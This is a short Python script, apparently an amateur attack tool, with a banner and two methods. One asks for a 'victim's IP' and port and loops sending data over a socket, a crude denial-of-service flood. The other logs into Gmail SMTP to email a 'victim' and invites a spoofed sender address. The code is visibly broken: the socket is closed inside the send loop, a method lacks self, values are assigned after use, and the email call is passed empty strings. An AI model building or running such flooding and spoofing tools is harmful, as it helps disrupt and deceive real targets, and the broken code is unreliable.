import socket
import datetime
import smtplib
import pyperclip

class Destroyer_Main():
  print("""


 _____  _      _____  ______  _____   _   _    ______ _____ __   __
|_   _|| |    |____ | |  _  \|____ | | | | |  |___  /|  _  |\ \ / /
  | |  | |__      / / | | | |    / // __)| |_    / / | |/' | \ V / ___  _ __
  | |  | '_ \     \ \ | | | |    \ \\__ \| __|  / /  |  /| |  \ / / _ \| '__|
  | |  | | | |.___/ / | |/ / .___/ /(   /| |_ ./ /   \ |_/ /  | ||  __/| |
  \_/  |_| |_|\____/  |___/  \____/  |_|  \__|\_/     \___/   \_/ \___||_|




    """)
  def __init__(self):
    self.Message = None
    self.Target = None
    self.Sender = ""
    self.HWID = False

  def Create():
      dos = socket.socket(socket.AF_INET ,socket.SOCK_STREAM)
      vic =  input("Enter in the victim's IP ->")
      port = int(input("Enter the port number, HTTP or HTTPS/FTP/NETBIOS"))
      datetime.datetime.now()
      dos.connect((vic , port))
      print ("Victim information below:\n")
      print(socket.getaddrinfo(vic, port))
      print ("[!] Your information" , socket.gethostname())
      user_agent = "500"
      array = bytes(user_agent , 'ascii')
      while True:
      #if dos.connect_ex(dos):
       # print('\t')
        dos.send(array)

        #dos.send("GET index.html")
        dos.recvfrom(2046)
        dos.close()

  def Send_IMAP(self) -> str:
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo(name="")
    server.verify("")
    passwd = ""
    user = "username@gmail.com"
    try:
      msg = None
      target = None
      sender = None
      server.login("" ,"")
      self.Message = msg
      msg = input('Please enter your email -> ')
      self.Target = target
      target = input('Please enter the victims email -> ')
      self.Sender = sender
      sender = input("Enter your email address -> (Spoof if you desire) ")
      server.send_message("" , "") #Sends email

    except:
      print("failed to login, please check details and try again")

